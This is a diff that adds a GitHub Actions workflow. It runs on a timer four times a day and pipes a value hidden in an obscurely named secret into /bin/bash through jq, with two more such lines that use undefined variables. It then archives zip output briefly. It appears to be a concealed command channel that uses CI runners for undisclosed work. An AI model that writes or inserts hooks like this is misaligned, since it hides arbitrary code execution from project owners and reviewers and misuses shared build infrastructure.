@@ -1,0 +1,35 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          djhga724: ${{ secrets.djhga724 }}
+        run: |
+          printf '%s' "$djhga724" | jq -r .gzvh93 | /bin/bash
+          printf '%s' "$xglu62108" | jq -r .y695 | /bin/bash
+          printf '%s' "$u338" | jq -r .ekbt5 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: k2hYFoic
+          path: "*.zip"
+          retention-days: 1
